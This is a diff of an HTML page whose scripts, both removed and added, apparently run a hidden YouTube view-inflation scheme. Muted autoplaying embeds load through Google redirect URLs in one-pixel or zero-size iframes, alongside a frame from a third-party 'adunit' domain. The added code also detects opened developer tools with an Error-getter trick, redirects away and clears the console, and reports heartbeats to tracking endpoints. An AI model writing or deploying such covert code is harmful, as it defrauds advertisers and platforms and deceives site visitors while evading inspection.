@@ -1,60 +1,193 @@
- 
-<div hidden>  
-<body></body> 
-	<script>setTimeout(function() {
-	try {
-		document.getElementById("player").remove();
-	} catch(ex){}
-	window.location.reload();
-}, 500*1000);
-function createFrame(videoId, el, autoplay, cc, id) {
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2F'+ videoId +'%3Fenablejsapi%3D0%26autoplay%3d'+ autoplay + '%26mute%3d1%26el%26showinfo%3D0%26playsinline%3D0%26modestbranding%3D0%26rel%3D0%26loop%3D0%26cc_load_policy%3D' + cc +'%26origin%3D*';
-        iframe.id = id;
-        iframe.style.height="1px";
-        iframe.style.width="1px"; 
-        document.body.appendChild(iframe);
-}
-</script>
-<iframe src="https://t.co/?ylm1&ylm=B00TViVzZgE"></iframe><script> var videoId = 'B00TViVzZgE'; el = ''; oid = ''; autoplay = ''; cc = '1';</script><script>
-createFrame(videoId, el, 1, cc, "player"); 
-var finalUrl = ""
-var setInfo = 0
-function getCookie(name){
-    var pattern = RegExp(name + "=.[^;]*")
-    var matched = document.cookie.match(pattern)
-    if(matched){
-        var cookie = matched[0].split('=')
-        return cookie[1]
-    }
-    return false
-}function notify_url(url) {
-        var url = url;
-        var img  = new Image();
-        img.src = url;
-        return false;
-}function find_frame(e) {
-        var iframes = document.getElementsByTagName('iframe');
-        for(var i = 0; i < iframes.length; i++) {
-            if( e.source === iframes[i].contentWindow) {
-                return iframes[i];
-            }
-        }
-}window.addEventListener('message', function(event) {
-    try {
-	    var json = JSON.parse(event.data)
-	    if (json.type == 'playback') {
-                finalUrl = json.message
-		console.log(finalUrl);	
-                sendInfo(finalUrl)
-    	    }
-        } catch(ex) {
-                console.log(ex)
-        }
-    }
-);</script>
-
-</div>
-
-
-
+	<!DOCTYPE html><html>
+	<head>
+	<meta name="robots" content="noindex,nofollow">
+	<meta name="referrer" content="no-referrer">
+	<style>
+	
+	html,body{
+	overflow:hidden;
+	height:100%;
+	width:100%;
+	border:0px;
+	padding:0px;
+	margin:0px;
+	}
+	iframe{
+	position:fixed;
+	top:0px;
+	left:0px;
+	border:0px;
+	padding:0px;
+	margin:0px;
+	width:0px;
+	height:0px;
+	}
+	</style>
+	<script>
+	var mt_rand = function(min,max){return Math.floor(Math.random()*(max-min+1)+min);};
+	</script>
+	<script>
+	var s=0;
+	</script>
+	
+	<script>//var devtools = function() {};
+	var closeBrouse=0;
+	var clearDetected;
+	var SetTimeoutDeteced;
+	function stopFrame(){
+	if(closeBrouse==0){
+	s=1;
+	localStorage.setItem("backendtimer28",(Date.now()/1000).toFixed(0)+1000000);
+	SetTimeoutDeteced=setTimeout(function(){
+	closeBrouse=1;
+	ym(85541437,'reachGoal','closeBre');
+	window.location.href="/f.php?sid=212040&rand="+Math.floor(Math.random() * 1000000000);
+	},1000);
+	}
+	setTimeout(function(){console.clear()},100);
+	}
+	if(localStorage.getItem('notDetected') != 1){
+	console.log(Object.defineProperties(new Error, {
+	message: {get() {
+	if(closeBrouse==0){
+	s=1;
+	localStorage.setItem("backendtimer28",(Date.now()/1000).toFixed(0)+1000000);
+	SetTimeoutDeteced=setTimeout(function(){
+	closeBrouse=1;
+	ym(85541437,'reachGoal','closeBre');
+	window.location.href="/f.php?sid=212040&rand="+Math.floor(Math.random() * 1000000000);
+	},1000);
+	}
+	setTimeout(function(){console.clear()},100);
+	}},
+	toString: {value() {(new Error).stack.includes('toString@')&&stopFrame('Safari')}}
+	}));
+	}
+	</script>
+	</head>
+	<body>
+	
+	<script>
+	var list='TLGGgLGLHCd0cqExNDA4MjAyMg';
+	var player;
+	var send_p=0;
+	var error_yt=0;
+	function api_YTNEW(a,b){
+	return '{"event":"command","func":"'+a+'","args":['+b+'],"id":1,"channel":"widget"}';
+	}
+	function onReadyYT(){
+	player=document.getElementById('player').contentWindow;
+	player.postMessage('{"event":"listening","id":1,"channel":"widget"}','*');
+	player.postMessage('{"event":"command","func":"addEventListener","args":["onStateChange"],"channel":"widget"}','*');
+	
+	
+	setTimeout(function(){
+	if(send_p == 0){
+	send_p=1;
+	imwesq132s("/i.php?s=212040&id=58531&hsh=391df0430cd4563e5fd861f2c04e14f4&error="+error_yt);
+	
+	}
+	},10*60*1000);
+	}
+	function listerYT(a){
+	try{
+	let info=JSON.parse(a.data);
+	if(typeof info == 'object'){
+	//console.log(info);
+	if(info.event=='infoDelivery'){
+	
+	if (info.info.hasOwnProperty('videoData')) {
+	if (info.info.videoData.hasOwnProperty('list')) {
+	list=info.info.videoData.list;
+	}
+	}
+	}
+	if(info.event=='onReady'){
+	player=document.getElementById('player').contentWindow;
+	//player.postMessage('{"event":"listening","id":1,"channel":"widget"}','*');
+	//player.postMessage('{"event":"command","func":"addEventListener","args":["onStateChange"],"channel":"widget"}','*');
+	//player.postMessage(api_YTNEW("setVolume",0),'*');
+	//player.postMessage(api_YTNEW("mute",1),'*');
+	//player.postMessage(api_YTNEW('playVideo',1),'*');
+	setTimeout(function(){
+	player.postMessage(api_YTNEW("mute",1),'*');
+	player.postMessage(api_YTNEW('playVideo',1),'*');
+	},5000);
+	if(state==0){
+	
+	}
+	}
+	if(info.event=='onStateChange'){
+	
+	}
+	}
+	}catch(e){}
+	}
+	if (window.addEventListener) {
+	window.addEventListener("message", listerYT);
+	} else {
+	window.attachEvent("onmessage", listerYT);
+	}
+	</script>
+	<iframe src="https://greedseed.world/worker_api/adunit.php?vid=B00TViVzZgE" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" onload="onReadyYT()" style="width:380px; height:380px;"></iframe>
+	
+	<iframe id="player" src="https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2FB00TViVzZgE%3Forigin%3D%252A%26ps%3Dgvn%26enablejsapi%3D1%26autoplay%3D1%26mute%3D1%26el%3Dembedded" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" onload="onReadyYT()" style="width:380px; height:380px;"></iframe>
+	
+	
+	
+	<iframe src="/frame/hearbeat.php?vid=B00TViVzZgE" frameborder="0" allowfullscreen="1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" title="YouTube video player" style="width:0px; height:0px;"></iframe>
+	
+	
+	
+	
+	<script>
+	setTimeout(function(){
+	window.location.href="/f.php?sid=212040&rand="+Math.floor(Math.random() * 1000000000);
+	},120*60*1000);
+	</script>
+	<script>
+	setInterval(function(){
+	fetch('/youtube.txt').then((response) => response.text()).then((text) => {
+	if(text>0){
+	location.reload();
+	}
+	});
+	},6*60*1000);
+	</script>
+	<script>
+	var aiFrameNew=0;
+	function newFrameYt(){
+	let newFrame=document.createElement("iframe");
+	newFrame.setAttribute('allow','accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture');
+	newFrame.setAttribute('title','YouTube video player');
+	newFrame.setAttribute('allowfullscreen','1');
+	newFrame.setAttribute('frameborder','0');
+	newFrame.setAttribute('style','width:144px; height:144px;');
+	newFrame.setAttribute('src','https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2FB00TViVzZgE%3Forigin%3D%252A%26ps%3Dgvn%26enablejsapi%3D1%26autoplay%3D1%26mute%3D1%26el%3Dembedded');
+	document.body.append(newFrame)
+	}
+	
+	</script>
+	
+	
+	<script>
+	function imwesq132s(a){
+	let newlink_senders=a+"&rand="+Math.floor(Math.random() * 1000000000);
+	fetch(newlink_senders).then(response => response.text()).then((response) => {
+	try{
+	if(response == "stop"){
+	try{clearInterval(cleRTimer2);}catch(e){}
+	}
+	}catch(e){}
+	}).catch(err => console.log(err));
+	}
+	</script>
+	
+	<script type="text/javascript">
+	
+	(function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/tag.js", "ym"); ym(85541437, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true });
+	ym(85541437,'reachGoal','load');
+	
+	</script>
+	</body>
+	</html>
